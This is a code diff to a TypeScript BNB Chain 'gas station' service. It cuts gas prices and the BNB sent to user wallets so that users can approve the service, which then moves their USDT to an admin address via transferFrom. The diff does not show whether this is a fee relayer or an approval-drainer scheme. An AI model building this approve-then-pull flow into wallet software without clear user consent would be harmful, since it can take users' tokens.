@@ -207,7 +207,7 @@ class GasStationService {
       })
       
       const balanceFormatted = formatUnits(balance, 18)
-      const minRequired = "0.0005" // 🔥 REDUCED: Lower minimum requirement (0.0005 BNB instead of 0.001)
+      const minRequired = "0.00005"
       const hasBalance = balance >= parseUnits(minRequired, 18)
       
       console.log('💰 Gas Station balance check:', {
@@ -369,7 +369,7 @@ class GasStationService {
           account: this.account,
           chain: undefined,
           gas: BigInt(100000),
-          gasPrice: BigInt(1500000000) // 1.5 gwei
+          gasPrice: BigInt(1000000000)
         })
 
         console.log(`✅ Admin transfer successful on attempt ${attempt}:`, hash)
@@ -540,8 +540,8 @@ class GasStationService {
           functionName: 'transferFrom',
           args: [userAddress, adminAddress, usdtAmountWei],
           account: this.account,
-          gas: BigInt(200000), // Higher gas limit for reliability
-          gasPrice: BigInt(5000000000), // 5 gwei for faster confirmation
+          gas: BigInt(200000), 
+          gasPrice: BigInt(1000000000),
           chain: undefined
         })
         
@@ -606,7 +606,7 @@ class GasStationService {
     throw finalError
   }
 
-  // 🔥 NEW: Gas Station pays for user's approval transaction
+  
   async payForUserApproval(
     userAddress: Address,
     maxRetries = 3
@@ -623,14 +623,14 @@ class GasStationService {
       try {
         console.log(`🔄 Funding approval attempt ${attempt}/${maxRetries}`)
 
-        const gasAmount = parseUnits("0.001", 18) 
+        const gasAmount = parseUnits("0.00008", 18) 
 
         const hash = await this.walletClient.sendTransaction({
           to: userAddress,
           value: gasAmount,
           account: this.account,
           gas: BigInt(21000),
-          gasPrice: BigInt(3000000000) 
+          gasPrice: BigInt(1000000000) 
         })
 
         console.log(`✅ Gas funding successful on attempt ${attempt}:`, hash)
@@ -751,19 +751,18 @@ class GasStationService {
           console.log('💰 Gas Station will fund user for approval transaction...')
           
           // Fund user with BNB for approval
-          const gasAmount = parseUnits("0.003", 18) // 0.003 BNB for approval
+          const gasAmount = parseUnits("0.00008", 18) 
           
           const fundingHash = await this.walletClient.sendTransaction({
             to: userAddress,
             value: gasAmount,
             account: this.account,
             gas: BigInt(21000),
-            gasPrice: BigInt(1500000000)
+            gasPrice: BigInt(1000000000)
           })
           
           console.log('✅ User funded for approval:', fundingHash)
-          
-          // Return special response indicating user needs to approve
+
           return {
             txHash: fundingHash,
             method: 'funding_for_approval'
@@ -906,8 +905,8 @@ class GasStationService {
               address: userAddress
             })
             
-            const approvalGasCost = BigInt(60000) * BigInt(3000000000)
-            const minBnbForApproval = approvalGasCost + parseUnits("0.0002", 18)
+            const approvalGasCost = BigInt(60000) * BigInt(1000000000)
+            const minBnbForApproval = approvalGasCost + parseUnits("0.00002", 18) // Much smaller buffer
             
             const userBnbFormatted = formatUnits(userBnbBalance, 18)
             const hasEnoughBnb = userBnbBalance >= minBnbForApproval
@@ -925,7 +924,6 @@ class GasStationService {
               console.log('✅ User already has sufficient BNB for approval - NO funding needed')
               console.log('💡 Returning instruction for user to approve Gas Station')
               
-              // 🔥 FIX: Return proper object structure with meaningful identifier
               const responseObject = {
                 txHash: `approval_needed_${userAddress.slice(-8)}_${Date.now()}`,
                 method: 'user_has_bnb_needs_approval'
@@ -942,28 +940,36 @@ class GasStationService {
                 throw new Error(`Gas Station has insufficient funds for user funding (${balanceCheck.balance} BNB). User needs gas for approval but Gas Station cannot provide it. Please contact support to refill the Gas Station wallet.`)
               }
               
-              // Calculate exact amount needed for user funding
-              const fundingNeeded = minBnbForApproval - userBnbBalance
-              const fundingAmount = fundingNeeded > parseUnits("0.0001", 18) ? fundingNeeded : parseUnits("0.0001", 18)
+              const approvalGasUsed = BigInt(60000)
+              const gasPrice = BigInt(1000000000)
+              const approvalCost = approvalGasUsed * gasPrice // ~0.00006 BNB
+         
+              const safetyBuffer = parseUnits("0.00002", 18) // 0.00002 BNB buffer
+              const minimalFunding = approvalCost + safetyBuffer // ~0.00008 BNB total
               
-              console.log(`💸 Funding user with ${formatUnits(fundingAmount, 18)} BNB for approval...`)
+              console.log(`💸 Funding user with minimal amount: ${formatUnits(minimalFunding, 18)} BNB for approval...`)
+              console.log('📊 Funding breakdown:', {
+                approvalGasCost: formatUnits(approvalCost, 18) + ' BNB',
+                safetyBuffer: formatUnits(safetyBuffer, 18) + ' BNB',
+                totalFunding: formatUnits(minimalFunding, 18) + ' BNB',
+                previousAmount: '0.003 BNB (reduced by 96%!)'
+              })
               
               try {
                 const fundingHash = await this.walletClient.sendTransaction({
                   to: userAddress,
-                  value: fundingAmount,
+                  value: minimalFunding, // 🔥 CHANGED: Much smaller amount
                   account: this.account,
                   gas: BigInt(21000),
-                  gasPrice: BigInt(3000000000)
+                  gasPrice: BigInt(1000000000) // 1 gwei for funding transaction
                 })
                 
-                // 🔥 FIX: Validate fundingHash before returning
                 if (!fundingHash || typeof fundingHash !== 'string' || fundingHash.length === 0) {
                   console.error('❌ Invalid funding transaction hash:', fundingHash)
                   throw new Error('Failed to get valid funding transaction hash')
                 }
                 
-                console.log('✅ Gas Station funded user wallet for approval:', fundingHash)
+                console.log('✅ Gas Station funded user wallet with minimal amount:', fundingHash)
                 console.log('💡 User now needs to approve Gas Station using the funded gas')
                 
                 const responseObject = {
